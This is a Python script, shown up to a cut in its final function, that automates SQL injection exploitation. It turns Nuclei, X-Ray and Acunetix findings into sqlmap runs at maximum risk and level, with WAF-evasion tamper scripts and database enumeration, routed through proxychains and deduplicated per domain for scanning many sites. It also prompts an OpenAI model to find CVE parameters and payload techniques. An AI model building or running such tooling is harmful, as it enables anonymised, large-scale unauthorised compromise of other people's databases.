#!/usr/bin/env python3

import json
import os
import sys
import argparse
import urllib.parse
import hashlib
import time
import subprocess
import csv
import re
from pathlib import Path
from typing import Dict, List, Optional, Tuple
import requests

OPENAI_API_KEY = os.environ.get("OPENAI_API_KEY")
OPENAI_MODEL = "gpt-4o-mini"
SQLMAP_PATH = "/root/sqlmap/sqlmap.py"

# ============================================================================
# SQLMAP COMMAND TEMPLATE - EDIT THIS TO CUSTOMIZE SQLMAP PARAMETERS
# ============================================================================
SQLMAP_CMD_TEMPLATE = 'proxychains4 -q python3 {sqlmap_path} -r "{request_file}" -p "{parameter}" --risk=3 --level=5 --batch --threads=2 --time-sec=60 --ignore-stdin'

SYSTEM_PROMPT = """You are a SQLMap expert. Analyze the vulnerability details and suggest ADDITIONAL SQLMap flags.

IMPORTANT: Base command already includes --risk=3 --level=5 --threads=2 --time-sec=60 --batch
You should ONLY provide additional/override flags!

Provide a JSON response with:
{
  "dbms": "oracle|mysql|postgresql|mssql|unknown",
  "technique": "T|B|E|U|S|Q",
  "tamper": ["space2comment", "between"],
  "flags": ["--delay=2"]
}

CRITICAL RULES:
1. If DBMS cannot be determined → use "unknown" (SQLMap will NOT receive --dbms flag)
2. If DBMS is clearly identified → use exact name: "oracle", "mysql", "postgresql", "mssql"
3. For "technique": Return ONLY ONE letter (most promising technique based on vulnerability)
4. DO NOT include --risk, --level, --threads, --time-sec, --batch in flags (already in base command)
5. Only add flags that OVERRIDE or ADD to base command (e.g., --delay, --tamper)

DBMS Detection Rules:
- Oracle: DBMS_PIPE.RECEIVE_MESSAGE, DBMS_LOCK.SLEEP, CHR() concatenation → "oracle"
- MySQL: SLEEP(), BENCHMARK(), MD5(), sysdate(), now(), if() → "mysql"
- PostgreSQL: pg_sleep(), pg_sleep_for() → "postgresql"
- MSSQL: WAITFOR DELAY, WAIT FOR → "mssql"
- Cannot determine → "unknown"
"""

USER_PROMPT_TEMPLATE = """Analyze this SQL injection vulnerability:

Type: {vuln_type}
Technique: {technique}
Payload: {payload}
Title: {title}

Time statistics:
- Average response: {avg_time}ms
- With payload: {p_time}ms
- Normal (without): {n_time}ms
- Sleep time: {sleep_time}ms
- Standard deviation: {std_dev}ms

Provide optimal SQLMap configuration."""


class ConsoleRenderer:
    COLORS = {
        'yellow': '\033[93m',
        'white': '\033[97m',
        'gray': '\033[90m',
        'green': '\033[92m',
        'red': '\033[91m',
        'cyan': '\033[96m',
        'reset': '\033[0m'
    }

    @staticmethod
    def print_banner():
        banner = ConsoleRenderer.COLORS['yellow'] + """
░░░░░░░░▀████▀▄▄░░░░░░░░░░░░░░▄█
░░░░░░░░░░█▀░░░░▀▀▄▄▄▄▄░░░░▄▄▀▀█
░░▄░░░░░░░░█░░░░░░░░░░▀▀▀▀▄░░▄▀
░▄▀░▀▄░░░░░░▀▄░░░░░░░░░░░░░░▀▄▀
▄▀░░░░█░░░░░█▀░░░▄█▀▄░░░░░░▄█
▀▄░░░░░▀▄░░█░░░░░▀██▀░░░░░██▄█
░▀▄░░░░▄▀░█░░░▄██▄░░░▄░░▄░░▀▀░█
░░█░░▄▀░░█░░░░▀██▀░░░░▀▀░▀▀░░▄▀
░█░░░█░░█░░░░░░▄▄░░░░░░░░░░░▄▀
░█▀▀░█▄█░█░█░█▀▄░█░█░█▀█░█▀█░█▀▀░█▀▄
░▀▀█░█░█░▄▀▄░█▀▄░█░█░█░█░█░█░█▀▀░█▀▄
░▀▀▀░▀░▀░▀░▀░▀░▀░▀▀▀░▀░▀░▀░▀░▀▀▀░▀░▀
""" + ConsoleRenderer.COLORS['reset']
        subtitle = "Intelligent SQLMap Automation with AI-Powered Optimization"
        
        print(banner)
        print(ConsoleRenderer.COLORS['white'] + subtitle + ConsoleRenderer.COLORS['reset'])
        print()

    @staticmethod
    def colored(text: str, color: str) -> str:
        return f"{ConsoleRenderer.COLORS.get(color, '')}{text}{ConsoleRenderer.COLORS['reset']}"

    @staticmethod
    def status(message: str, color: str = 'white'):
        print(ConsoleRenderer.colored(f"[*] {message}", color))

    @staticmethod
    def success(message: str):
        print(ConsoleRenderer.colored(f"[+] {message}", 'green'))

    @staticmethod
    def error(message: str):
        print(ConsoleRenderer.colored(f"[-] {message}", 'red'))

    @staticmethod
    def warning(message: str):
        print(ConsoleRenderer.colored(f"[!] {message}", 'yellow'))


# ============================================================================
# NUCLEI PARSER - Parse Nuclei SQLi scan results
# ============================================================================
class NucleiParser:
    """Parser for Nuclei vulnerability scanner output with SQLi findings"""
    
    @staticmethod
    def parse_nuclei_file(nuclei_file: Path) -> List[Dict]:
        """
        Parse Nuclei output file and extract SQLi targets
        
        Format: [CVE-2022-22897:time-based] [http] [critical] https://example.com/path?param=value
        
        Returns list of vulnerability dicts
        """
        vulnerabilities = []
        seen_domains = set()
        
        if not nuclei_file.exists():
            ConsoleRenderer.error(f"Nuclei file not found: {nuclei_file}")
            return vulnerabilities
        
        with open(nuclei_file, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                
                # Parse nuclei format: [CVE-XXXX-XXXXX:type] [protocol] [severity] URL
                match = re.match(r'\[([^\]]+)\]\s*\[([^\]]+)\]\s*\[([^\]]+)\]\s*(.+)', line)
                if not match:
                    continue
                
                cve_info = match.group(1)  # CVE-2022-22897:time-based
                protocol = match.group(2).lower()  # http
                severity = match.group(3)  # critical
                url = match.group(4).strip()
                
                # Skip non-HTTP protocols (tcp, ftp, etc.)
                if protocol not in ('http', 'https'):
                    continue
                
                # Clean URL - remove trailing garbage like ' ["SQL syntax..."]
                # URL ends at first space or opening bracket after the path
                if ' [' in url:
                    url = url.split(' [')[0].strip()
                elif ' "' in url:
                    url = url.split(' "')[0].strip()
                
                # Remove trailing quotes that are part of error messages, not URL
                url = url.rstrip("'\"")
                
                # Extract CVE and SQLi type
                cve_parts = cve_info.split(':')
                cve = cve_parts[0].upper()
                sqli_type = cve_parts[1] if len(cve_parts) > 1 else 'unknown'
                # For non-CVE templates, sqli_type may contain DBMS info (e.g., "MySQL", "MicrosoftSQLServer")
                template_dbms_hint = sqli_type if not cve.startswith('CVE-') else None
                
                # Parse URL
                try:
                    parsed = urllib.parse.urlparse(url)
                    domain = parsed.netloc
                    path = parsed.path
                    query_params = urllib.parse.parse_qs(parsed.query)
                    params_flat = {k: v[0] if v else '' for k, v in query_params.items()}
                except Exception as e:
                    ConsoleRenderer.warning(f"Error parsing URL {url[:50]}: {e}")
                    continue
                
                # Deduplicate by domain (one scan per domain)
                if domain in seen_domains:
                    continue
                seen_domains.add(domain)
                
                vuln = {
                    'source': 'nuclei',
                    'cve': cve,
                    'sqli_type': sqli_type,
                    'template_dbms_hint': template_dbms_hint,
                    'url': url,
                    'domain': domain,
                    'path': path,
                    'params': params_flat,
                    'severity': severity,
                    'protocol': protocol,
                    'raw_line': line
                }
                
                vulnerabilities.append(vuln)
        
        ConsoleRenderer.status(f"Loaded {len(vulnerabilities)} unique SQLi targets from Nuclei", 'gray')
        return vulnerabilities

    @staticmethod
    def create_request_file(vuln: Dict, output_dir: Path) -> Optional[Tuple[str, str]]:
        """Create HTTP request file from Nuclei URL for sqlmap -r flag"""
        try:
            url = vuln['url']
            domain = vuln['domain']
            params = vuln.get('params', {})
            
            parsed = urllib.parse.urlparse(url)
            path = parsed.path or '/'
            query = parsed.query
            
            # Build HTTP request
            if query:
                request_line = f"GET {path}?{query} HTTP/1.1"
            else:
                request_line = f"GET {path} HTTP/1.1"
            
            request = f"""{request_line}
Host: {domain}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close

"""
            
            # Determine parameter to test
            param_name = list(params.keys())[0] if params else 'id'
            
            # Create output directory
            domain_dir = output_dir / domain.replace(':', '_')
            domain_dir.mkdir(parents=True, exist_ok=True)
            
            # Save request file
            request_hash = hashlib.md5(url.encode()).hexdigest()[:8]
            safe_param = re.sub(r'[^\w]', '_', param_name)[:30]
            filename = f"{safe_param}_GET_{request_hash}.txt"
            filepath = domain_dir / filename
            
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(request)
            
            return str(filepath), param_name
            
        except Exception as e:
            ConsoleRenderer.error(f"Failed to create request file: {e}")
            return None


# ============================================================================
# AI ANALYZER with Web Search for CVE Analysis
# ============================================================================
class AIAnalyzer:
    def __init__(self, api_key: str):
        self.api_key = api_key
        self.session = requests.Session()
        self.session.headers.update({
            'Authorization': f'Bearer {api_key}',
            'Content-Type': 'application/json'
        })
        # Cache CVE analysis results to avoid duplicate API calls
        self.cve_cache = {}
    
    def search_cve_info(self, cve: str, url: str, vuln: Dict = None) -> Optional[Dict]:
        """
        Use AI with web search to analyze CVE and determine SQLi parameters
        
        Uses OpenAI's web search capability via Responses API or falls back to
        knowledge-based analysis. Results are cached by CVE to avoid duplicate API calls.
        """
        # Handle non-CVE template names (Nuclei template IDs that are not CVE format)
        # These are SQLi templates like "error-based-sql-injection", "vbulletin-ajaxreg-sqli"
        cve_upper = cve.upper()
        
        # For non-CVE templates, include DBMS hint in cache key (e.g., ERROR-BASED:MySQL vs ERROR-BASED:MSSQL)
        template_dbms_hint = vuln.get('template_dbms_hint', '') if vuln else ''
        cache_key = f"{cve}:{template_dbms_hint}" if template_dbms_hint else cve
        
        # Check cache first
        if cache_key in self.cve_cache:
            ConsoleRenderer.status(f"Using cached CVE info for {cve}", 'gray')
            return self.cve_cache[cache_key]
        
        if not cve_upper.startswith('CVE-'):
            ConsoleRenderer.status(f"Non-CVE template: {cve}, using SQLi defaults", 'gray')
            
            # Determine technique from template name
            technique = 'TBEUSQ'  # All techniques by default
            dbms = 'mysql'  # Most common
            
            if 'ERROR' in cve_upper or 'ERROR-BASED' in cve_upper:
                technique = 'E'
                notes = "Error-based SQL injection detected by Nuclei"
            elif 'UNION' in cve_upper:
                technique = 'U'
                notes = "Union-based SQL injection detected by Nuclei"
            elif 'TIME' in cve_upper or 'BLIND' in cve_upper:
                technique = 'T'
                notes = "Time-based blind SQL injection detected by Nuclei"
            elif 'BOOLEAN' in cve_upper:
                technique = 'B'
                notes = "Boolean-based SQL injection detected by Nuclei"
            else:
                notes = f"SQL injection template: {cve}"
            
            # Check for DBMS hints in template name AND sqli_type (after colon)
            # e.g., error-based-sql-injection:MicrosoftSQLServer
            template_dbms_hint = vuln.get('template_dbms_hint', '') if vuln else ''
            dbms_check = (cve_upper + ' ' + template_dbms_hint.upper()).strip()
            
            if 'MYSQL' in dbms_check:
                dbms = 'mysql'
            elif 'MSSQL' in dbms_check or 'MICROSOFT' in dbms_check or 'SQLSERVER' in dbms_check:
                dbms = 'mssql'
            elif 'POSTGRES' in dbms_check:
                dbms = 'postgresql'
            elif 'ORACLE' in dbms_check:
                dbms = 'oracle'
            
            # For non-CVE templates, find param with SQL payload in value
            vulnerable_param = None
            if vuln and 'params' in vuln:
                params = vuln.get('params', {})
                sql_keywords = ['select', 'union', 'sleep', 'from(', 'or(', 'and(', 'benchmark']
                for param_name, param_value in params.items():
                    if param_value:
                        val_lower = urllib.parse.unquote(str(param_value)).lower()
                        if any(kw in val_lower for kw in sql_keywords):
                            vulnerable_param = param_name
                            break
            
            non_cve_config = {
                'is_sqli': True,
                'dbms': dbms,
                'technique': technique,
                'vulnerable_param': vulnerable_param,
                'tamper': ['between', 'randomcase'],
                'time_sec': 10,
                'notes': notes
            }
            self.cve_cache[cache_key] = non_cve_config
            return non_cve_config
        
        ConsoleRenderer.status(f"Searching CVE info for {cve}...", 'gray')
        
        prompt = f"""You are a security researcher. Search the web for information about this CVE and analyze it for SQL injection exploitation.

CVE: {cve}
Target URL: {url}

SEARCH AND ANALYZE:
1. Search for "{cve}" on NVD, CVE databases, security advisories, PoC repositories
2. Determine: Is this a SQL injection vulnerability?
3. Find: What CMS/software is affected? (PrestaShop, WordPress, Joomla, etc.)
4. Find: What is the vulnerable parameter name?
5. Find: What HTTP method is used (GET/POST)?
6. Find: What payload/technique works? (time-based, error-based, union-based)
7. Determine optimal sqlmap configuration

RESPOND WITH JSON ONLY:
{{
    "is_sqli": true,
    "cms": "PrestaShop",
    "module": "appagebuilder",
    "vulnerable_param": "profile_id",
    "method": "POST",
    "post_data": "profile_id=1",
    "dbms": "mysql",
    "technique": "T",
    "tamper": ["between", "randomcase", "space2comment"],
    "time_sec": 10,
    "risk": 3,
    "level": 5,
    "notes": "Time-based blind SQLi in PrestaShop appagebuilder module",
    "exploit_url": "https://example.com/modules/appagebuilder/apajax.php"
}}

If NOT SQL injection, return: {{"is_sqli": false, "notes": "reason"}}

IMPORTANT: Search the web for actual CVE details. Do not guess."""

        try:
            # Use OpenAI SDK with Responses API and web search
            response = self.client.responses.create(
                model='gpt-4o-mini',
                tools=[{'type': 'web_search_preview'}],
                input=prompt,
                temperature=0.1
            )
            
            # Get response text directly from SDK
            content = response.output_text if hasattr(response, 'output_text') else ''
            
            if content:
                result = self._parse_ai_json(content)
                if result:
                    self.cve_cache[cve] = result
                    return result
            
            # Fallback to chat completions with knowledge
            result = self._fallback_cve_analysis(cve, url)
            if result:
                self.cve_cache[cve] = result
                return result
            
            # Use default if fallback also failed
            default_config = self._get_default_config(cve)
            self.cve_cache[cve] = default_config
            return default_config
            
        except Exception as e:
            ConsoleRenderer.warning(f"Web search failed: {e}")
            result = self._fallback_cve_analysis(cve, url)
            if result:
                self.cve_cache[cve] = result
            else:
                # Cache default config to avoid repeated failed requests
                default_config = self._get_default_config(cve)
                self.cve_cache[cve] = default_config
                return default_config
            return result
    
    def _get_default_config(self, cve: str) -> Dict:
        """Return default SQLi config when AI fails"""
        return {
            'is_sqli': True,
            'dbms': 'mysql',
            'technique': 'T',
            'tamper': ['between', 'randomcase'],
            'time_sec': 10,
            'risk': 3,
            'level': 5,
            'notes': f'Default config for {cve} (AI unavailable)'
        }
    
    def _fallback_cve_analysis(self, cve: str, url: str) -> Optional[Dict]:
        """Fallback CVE analysis using gpt-4o-mini knowledge"""
        prompt = f"""Analyze this CVE for SQL injection exploitation based on your knowledge.

CVE: {cve}
URL: {url}

You have knowledge of common CVEs up to your training date. Analyze:
1. Is this a known SQL injection CVE?
2. What software/CMS is affected?
3. What is the vulnerable parameter?
4. What HTTP method and payload type?
5. Optimal sqlmap configuration?

RESPOND WITH JSON ONLY:
{{
    "is_sqli": true/false,
    "cms": "software name",
    "module": "module name",
    "vulnerable_param": "param_name",
    "method": "GET/POST",
    "post_data": "body if POST",
    "dbms": "mysql/postgresql/mssql/oracle",
    "technique": "T/B/E/U",
    "tamper": ["script1", "script2"],
    "time_sec": 10,
    "risk": 3,
    "level": 5,
    "notes": "description"
}}"""

        try:
            response = self.session.post(
                'https://api.openai.com/v1/chat/completions',
                json={
                    'model': OPENAI_MODEL,
                    'messages': [
                        {'role': 'system', 'content': 'You are a security expert. Respond only with valid JSON.'},
                        {'role': 'user', 'content': prompt}
                    ],
                    'temperature': 0.1,
                    'max_tokens': 1024
                },
                timeout=60
            )
            
            if response.status_code == 200:
                result = response.json()
                content = result['choices'][0]['message']['content']
                parsed = self._parse_ai_json(content)
                if parsed:
                    return parsed
            
            return None
            
        except Exception as e:
            ConsoleRenderer.warning(f"Fallback analysis failed: {e}")
            return None
    
    def _parse_ai_json(self, content: str) -> Optional[Dict]:
        """Parse JSON from AI response, handling markdown code blocks"""
        try:
            # Remove markdown code blocks
            content = re.sub(r'```json\s*', '', content)
            content = re.sub(r'```\s*', '', content)
            return json.loads(content.strip())
        except json.JSONDecodeError:
            # Try to find JSON object in response
            match = re.search(r'\{[^{}]*\}', content, re.DOTALL)
            if match:
                try:
                    return json.loads(match.group(0))
                except:
                    pass
            return None

    def analyze_vulnerability(self, vuln: Dict) -> Optional[Dict]:
        """Analyze X-Ray JSON vulnerability"""
        try:
            extra = vuln['detail']['extra']
            payload = vuln['detail']['payload']
            
            user_prompt = USER_PROMPT_TEMPLATE.format(
                vuln_type=extra.get('type', 'unknown'),
                technique=extra.get('title', 'unknown'),
                payload=payload,
                title=extra.get('title', 'unknown'),
                avg_time=extra.get('avg_time', 'N/A'),
                p_time=extra.get('p_time', 'N/A'),
                n_time=extra.get('n_time', 'N/A'),
                sleep_time=extra.get('sleep_time', 'N/A'),
                std_dev=extra.get('std_dev', 'N/A')
            )
            
            response = self.session.post(
                'https://api.openai.com/v1/chat/completions',
                json={
                    'model': OPENAI_MODEL,
                    'messages': [
                        {'role': 'system', 'content': SYSTEM_PROMPT},
                        {'role': 'user', 'content': user_prompt}
                    ],
                    'temperature': 0.3,
                    'max_tokens': 1024,
                    'response_format': {'type': 'json_object'}
                },
                timeout=60
            )
            
            if response.status_code == 200:
                result = response.json()
                content = result['choices'][0]['message']['content']
                return json.loads(content)
            else:
                ConsoleRenderer.error(f"OpenAI API error: {response.status_code}")
                return None
                
        except Exception as e:
            ConsoleRenderer.error(f"AI analysis failed: {e}")
            return None
    
    def analyze_acunetix_vulnerability(self, vuln: Dict) -> Optional[Dict]:
        """Analyze Acunetix CSV vulnerability (simplified version)"""
        parameter = vuln.get('parameter', '').strip()
        details = vuln.get('details', '').strip()
        
        if not parameter:
            return None
        
        # Default config
        config = {
            'dbms': 'unknown',
            'technique': 'B',
            'tamper': [],
            'flags': []
        }
        
        # Detect DBMS from details
        details_lower = details.lower()
        if 'mysql' in details_lower or 'sleep(' in details_lower:
            config['dbms'] = 'mysql'
        elif 'postgresql' in details_lower or 'pg_sleep' in details_lower:
            config['dbms'] = 'postgresql'
        elif 'mssql' in details_lower or 'waitfor' in details_lower:
            config['dbms'] = 'mssql'
        elif 'oracle' in details_lower:
            config['dbms'] = 'oracle'
        
        # Detect technique
        if 'time' in details_lower or 'sleep' in details_lower:
            config['technique'] = 'T'
        elif 'error' in details_lower:
            config['technique'] = 'E'
        
        return config


# ============================================================================
# VULNERABILITY PARSER (X-Ray JSON)
# ============================================================================
class VulnerabilityParser:
    @staticmethod
    def parse_json_report(json_path: str) -> List[Dict]:
        try:
            with open(json_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
            
            if not isinstance(data, list):
                data = [data]
            
            return data
        except json.JSONDecodeError as e:
            ConsoleRenderer.error(f"JSON parse error: {e}")
            return []

    @staticmethod
    def extract_parameter_name(vuln: Dict) -> Optional[str]:
        try:
            return vuln['detail']['extra']['param']['key']
        except (KeyError, TypeError):
            return None

    @staticmethod
    def create_request_file_with_ai(vuln: Dict, output_dir: Path, api_key: str) -> Optional[Tuple[str, str]]:
        """Create request file using AI to intelligently extract and clean HTTP request"""
        try:
            target_url = vuln.get('target', {}).get('url', '')
            domain = urllib.parse.urlparse(target_url).netloc if target_url else 'unknown'
            
            # Get snapshot
            snapshots = vuln.get('detail', {}).get('snapshot', [])
            if not snapshots:
                return None
            
            snapshot = snapshots[0]
            if isinstance(snapshot, list):
                snapshot = snapshot[0]
            
            # Simple extraction without AI for speed
            param_name = VulnerabilityParser.extract_parameter_name(vuln)
            if not param_name:
                return None
            
            payload = vuln.get('detail', {}).get('payload', '')
            
            # Replace payload with simple value
            cleaned_request = snapshot.replace(urllib.parse.quote(payload, safe=''), '1')
            if cleaned_request == snapshot:
                cleaned_request = snapshot.replace(payload, '1')
            
            # Save request file
            domain_dir = output_dir / domain
            domain_dir.mkdir(parents=True, exist_ok=True)
            
            method = 'POST' if cleaned_request.startswith('POST') else 'GET'
            request_hash = hashlib.md5(cleaned_request.encode()).hexdigest()[:8]
            safe_param = re.sub(r'[^\w]', '_', param_name)[:50]
            filename = f"{safe_param}_{method}_{request_hash}.txt"
            filepath = domain_dir / filename
            
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(cleaned_request)
            
            return str(filepath), param_name
            
        except Exception as e:
            ConsoleRenderer.error(f"Failed to create request file: {e}")
            return None


# ============================================================================
# ACUNETIX CSV PARSER (simplified)
# ============================================================================
class AcunetixCSVParser:
    @staticmethod
    def parse_csv_file(csv_file: Path) -> List[Dict]:
        vulnerabilities = []
        
        try:
            with open(csv_file, 'r', encoding='utf-8') as f:
                reader = csv.DictReader(f)
                
                for row in reader:
                    vuln_type = (row.get('Type', '') or row.get('Vulnerability', '') or '').lower()
                    
                    if 'sql' not in vuln_type:
                        continue
                    
                    target = row.get('Target', '') or row.get('URL', '') or ''
                    domain = urllib.parse.urlparse(target).netloc if target else 'unknown'
                    
                    vuln = {
                        'source': 'acunetix',
                        'domain': domain,
                        'parameter': row.get('Parameter', '').strip(),
                        'target_url': target,
                        'request': row.get('Request', '').strip(),
                        'details': row.get('Raw text Details', '') or row.get('Details', ''),
                        'severity': row.get('Severity', '').strip()
                    }
                    
                    vulnerabilities.append(vuln)
            
            ConsoleRenderer.status(f"Loaded {len(vulnerabilities)} SQL injection(s) from CSV", 'gray')
            return vulnerabilities
            
        except Exception as e:
            ConsoleRenderer.error(f"Failed to parse CSV: {e}")
            return []
    
    @staticmethod
    def create_request_file_with_ai(vuln: Dict, output_dir: Path, api_key: str) -> Optional[Tuple[str, str]]:
        """Create request file from Acunetix data"""
        try:
            domain = vuln.get('domain', 'unknown')
            parameter = vuln.get('parameter', '')
            request_text = vuln.get('request', '')
            
            if not parameter or not request_text:
                return None
            
            # Save request file
            domain_dir = output_dir / domain
            domain_dir.mkdir(parents=True, exist_ok=True)
            
            method = 'POST' if request_text.startswith('POST') else 'GET'
            request_hash = hashlib.md5(request_text.encode()).hexdigest()[:8]
            safe_param = re.sub(r'[^\w]', '_', parameter)[:50]
            filename = f"{safe_param}_{method}_{request_hash}.txt"
            filepath = domain_dir / filename
            
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(request_text)
            
            return str(filepath), parameter
            
        except Exception as e:
            ConsoleRenderer.error(f"Failed to create request file: {e}")
            return None


# ============================================================================
# SQLMAP RUNNER
# ============================================================================
class SQLMapRunner:
    @staticmethod
    def build_command(request_file: str, parameter: str, ai_config: Optional[Dict], sql_output_dir: Optional[str] = None) -> str:
        """Build SQLMap command with fixed base template + AI additions"""
        cmd = SQLMAP_CMD_TEMPLATE.format(
            sqlmap_path=SQLMAP_PATH,
            request_file=request_file,
            parameter=parameter
        )
        
        if sql_output_dir:
            cmd += f' --output-dir="{sql_output_dir}"'
        
        if ai_config:
            dbms = ai_config.get('dbms', '').lower()
            if dbms and dbms != 'unknown':
                cmd += f' --dbms={dbms}'
            
            technique = ai_config.get('technique', '').upper()
            if technique and technique in 'TBEUSQ':
                all_techniques = ['B', 'E', 'U', 'S', 'T', 'Q']
                technique_list = [technique] + [t for t in all_techniques if t != technique]
                cmd += f' --technique={"".join(technique_list)}'
            
            tampers = ai_config.get('tamper', [])
            if tampers:
                cmd += f' --tamper={",".join(tampers)}'
            
            time_sec = ai_config.get('time_sec')
            if time_sec:
                cmd = cmd.replace('--time-sec=60', f'--time-sec={time_sec}')
        
        return cmd
    
    @staticmethod
    def build_nuclei_command(vuln: Dict, ai_config: Dict, sql_output_dir: str) -> str:
        """Build SQLMap command for Nuclei target"""
        url = vuln['url']
        
        # Helper to check if value is valid (not None, not N/A, not empty)
        def is_valid(val):
            if val is None:
                return False
            if isinstance(val, str):
                return val.strip().lower() not in ('', 'n/a', 'none', 'unknown', 'null')
            return True
        
        param = ai_config.get('vulnerable_param')
        # Handle case when AI returns list of params - take first one
        if isinstance(param, list):
            param = param[0] if param else None
        # Handle comma-separated string (e.g., "param1, param2")
        elif isinstance(param, str) and ',' in param:
            param = param.split(',')[0].strip()
        url_params = list(vuln.get('params', {}).keys())
        
        # Validate param exists in URL, otherwise don't use -p flag
        if is_valid(param):
            # Check if AI-suggested param actually exists in URL
            if param not in url_params:
                # AI param not in URL - try to find matching param or skip
                param = None
        
        if not is_valid(param) and url_params:
            # Use first URL param as fallback
            param = url_params[0]
        
        # Ensure time_sec is positive integer
        time_sec = ai_config.get('time_sec', 10)
        if not isinstance(time_sec, int) or time_sec <= 0:
            time_sec = 10
        
        # If AI suggests param not in URL, add it to URL
        ai_param = ai_config.get('vulnerable_param')
        # Handle case when AI returns list of params - take first one
        if isinstance(ai_param, list):
            ai_param = ai_param[0] if ai_param else None
        # Handle comma-separated string (e.g., "param1, param2")
        elif isinstance(ai_param, str) and ',' in ai_param:
            ai_param = ai_param.split(',')[0].strip()
        if is_valid(ai_param) and ai_param not in url_params:
            # Add the vulnerable param to URL
            separator = '&' if '?' in url else '?'
            url = f"{url}{separator}{ai_param}=1"
            param = ai_param  # Now we can use it
        
        # Clean URL from existing payloads if present
        # Rebuild clean URL without SQL injection payloads in params
        try:
            parsed = urllib.parse.urlparse(url)
            if parsed.query:
                # Parse query params and clean values that look like payloads
                clean_params = []
                for param_pair in parsed.query.split('&'):
                    if '=' in param_pair:
                        key, val = param_pair.split('=', 1)
                        # Check if value looks like a payload (contains SQL keywords or artifacts)
                        val_decoded = urllib.parse.unquote(val)
                        val_lower = val_decoded.lower()
                        
                        # SQL injection keywords
                        sql_keywords = ['select', 'union', 'sleep(', 'from(', 'or(', 'and(', 'benchmark', 'waitfor', 'delay']
                        # Payload artifacts from Nuclei (question mark placeholder, closing parens, comments)
                        payload_artifacts = val_decoded in ['?', '??', '%3f'] or \
                                          val_decoded.startswith(')))') or \
                                          val_decoded.startswith('--') or \
                                          '+OR+' in val or '+AND+' in val or \
                                          '%20OR%20' in val or '%20AND%20' in val
                        
                        is_payload = any(kw in val_lower for kw in sql_keywords) or payload_artifacts
                        if is_payload:
                            # Replace with clean test value
                            clean_params.append(f"{key}=1")
                        else:
                            clean_params.append(param_pair)
                    else:
                        clean_params.append(param_pair)
                
                clean_query = '&'.join(clean_params)
                url = urllib.parse.urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, clean_query, parsed.fragment
                ))
        except Exception:
            pass  # Keep original URL if cleaning fails
        
        # Use single quotes for URL to avoid bash interpretation of special chars
        # Escape any single quotes inside URL
        escaped_url = url.replace("'", "'\\''")
        
        cmd_parts = [
            'proxychains4', '-q',
            'python3', SQLMAP_PATH,
            '-u', f"'{escaped_url}'",
            '--batch',
            '--risk=3',
            '--level=5',
            '--threads=2',
            f'--time-sec={time_sec}',
            '--ignore-stdin',
            f'--output-dir="{sql_output_dir}"'
        ]
        
        # Only add -p if param is valid
        if is_valid(param):
            cmd_parts.extend(['-p', f"'{param}'"])
        
        dbms = ai_config.get('dbms', '')
        if is_valid(dbms):
            cmd_parts.append(f'--dbms={dbms.lower()}')
        
        technique = ai_config.get('technique', 'T').upper()
        # If technique is already all techniques (TBEUSQ or similar), use as-is
        # Otherwise, prioritize the specified technique
        if len(technique) > 1 and all(c in 'TBEUSQ' for c in technique):
            # Already a full technique string like 'TBEUSQ'
            cmd_parts.append(f'--technique={technique}')
        elif len(technique) == 1 and technique in 'TBEUSQ':
            # Single technique letter - prioritize it
            all_techniques = ['B', 'E', 'U', 'S', 'T', 'Q']
            technique_list = [technique] + [t for t in all_techniques if t != technique]
            cmd_parts.append(f'--technique={"".join(technique_list)}')
        
        tampers = ai_config.get('tamper', [])
        if tampers:
            cmd_parts.append(f'--tamper={",".join(tampers)}')
        
        method = ai_config.get('method', 'GET').upper()
        post_data = ai_config.get('post_data')
        if method == 'POST' and post_data:
            cmd_parts.append(f'--data="{post_data}"')
        
        cmd_parts.append('--dbs')
        
        return ' '.join(cmd_parts)

    @staticmethod
    def run_sequential(commands: List[Tuple[str, Dict]], output_dir: Path):
        """Run SQLMap commands sequentially with live output"""
        total = len(commands)
        
        for i, (cmd, vuln) in enumerate(commands, 1):
            domain = vuln.get('domain', 'unknown')
            cve = vuln.get('cve', 'N/A')
            
            ConsoleRenderer.status(f"\n[{i}/{total}] {domain}", 'yellow')
            ConsoleRenderer.status(f"CVE: {cve}", 'gray')
            ConsoleRenderer.status(f"Running sqlmap...", 'gray')
            
            # Create log directory
            log_dir = output_dir / domain.replace('.', '_').replace(':', '_') / 'logs'
            log_dir.mkdir(parents=True, exist_ok=True)
            log_file = log_dir / f"sqlmap_{int(time.time())}.log"
            
            try:
                # Run sqlmap with live output
                process = subprocess.Popen(
                    cmd,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    bufsize=1
                )
                
                found_vuln = False
                
                with open(log_file, 'w') as log:
                    log.write(f"Command: {cmd}\n")
                    log.write(f"Started: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                    log.write("="*80 + "\n\n")
                    
                    for line in process.stdout:
                        log.write(line)
                        log.flush()
                        
                        # Check for vulnerability detection
                        line_lower = line.lower()
                        if 'is vulnerable' in line_lower or 'sqlmap identified' in line_lower:
                            found_vuln = True
                            ConsoleRenderer.success(f"[VULN] {line.strip()[:70]}")
                        elif 'available databases' in line_lower:
                            ConsoleRenderer.success(f"[DB] {line.strip()[:70]}")
                        elif '[error]' in line_lower or '[critical]' in line_lower:
                            ConsoleRenderer.error(line.strip()[:70])
                
                process.wait()
                
                if found_vuln:
                    ConsoleRenderer.success(f"[+] {domain} is VULNERABLE!")
                else:
                    ConsoleRenderer.status(f"[-] {domain}: Not exploitable or protected", 'gray')
                
            except Exception as e:
                ConsoleRenderer.error(f"Error: {e}")
        
        ConsoleRenderer.success(f"\nSequential scan complete! Processed {total} targets.")

    @staticmethod
    def create_byobu_session(domain: str, commands: List[str], prefix: str = 'xtest'):
        """Create byobu/tmux session with SQLMap commands"""
        session_name = f"{prefix}_{domain.replace('.', '_')}_{int(time.time())}"
        multiplexer = None
        
        try:
            result = subprocess.run(['which', 'byobu'], capture_output=True)
            if result.returncode != 0:
                result = subprocess.run(['which', 'tmux'], capture_output=True)
                if result.returncode != 0:
                    return False
                multiplexer = 'tmux'
            else:
                multiplexer = 'byobu'
            
